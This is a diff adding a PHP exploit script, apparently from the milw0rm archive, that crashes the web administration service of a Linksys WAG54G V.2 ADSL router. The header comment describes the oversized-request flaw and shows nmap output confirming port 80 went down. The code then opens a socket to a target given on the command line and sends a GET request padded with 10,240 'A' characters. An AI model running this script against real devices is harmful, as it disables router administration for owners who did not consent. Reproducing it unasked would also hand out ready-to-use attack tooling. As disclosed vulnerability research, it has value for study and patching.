@@ -1,0 +1,64 @@
+<?php
+/*
+* LinkSys Wireless ADSL Router httpd DoS Vulnerability
+*
+* Product : Linksys (Division of Cisco Systems)
+* Device  : WAG54G V.2
+* Firmware: 1.02.20
+* Notes   : Other devices and firmware versions are no doubt vulnerable. 
+*
+* Written by: r0ut3r (writ3r [at] gmail.com / www.bmgsec.com.au)
+*
+* Sending a large HTTP GET/POST request (10240) to the router results in DoS
+* of the httpd service. 
+*
+* After discovering this vulnerability I read about similar vulnerabilities
+* in different devices. It would seem this device is vulnerable to more 
+* previously disclosed vulnerabilities also, just this device was not tested. 
+*
+* It has been suggested that this is a stack overflow vulnerability.
+* http://www.securiteam.com/securitynews/5NP0D15GUE.html
+* http://www.securityfocus.com/bid/6301/info
+*
+* unable to connect to 192.168.1.1:80 (Connection refused)
+*
+* r0ut3r@kit:~> nmap 192.168.1.1
+*
+* Starting Nmap 4.20 ( http://insecure.org ) at 2008-12-12 12:17 EST
+* Interesting ports on 192.168.1.1:
+* Not shown: 1695 closed ports
+* PORT    STATE SERVICE
+* 23/tcp  open  telnet
+* 443/tcp open  https
+*
+* Nmap finished: 1 IP address (1 host up) scanned in 7.403 seconds
+*
+* Looks like HTTP died... 
+* HTTPS is running however you cannot login. The service is basically useless. 
+* Telnet is also open for administration (if configured to be). 
+*
+* Apart from not being able to use the Web Administration Interface the device
+* seems to function fine. 
+*/
+
+set_time_limit(0);
+
+$host = "192.168.1.1"; //Default IP is 192.168.1.1
+if (isset($argv[1]))
+    $host = $argv[1];
+$port = 80;
+
+echo "Connecting...\n";
+$conn = fsockopen($host, $port, $errno, $errstr);
+if ($conn)
+{
+    $payload = "GET /".str_repeat('A', 10240)." HTTP/1.1";
+
+    if (fwrite($conn, $payload))
+        echo "Payload sent!\n";
+
+    fclose($conn);
+}
+?>
+
+# milw0rm.com [2008-12-21]
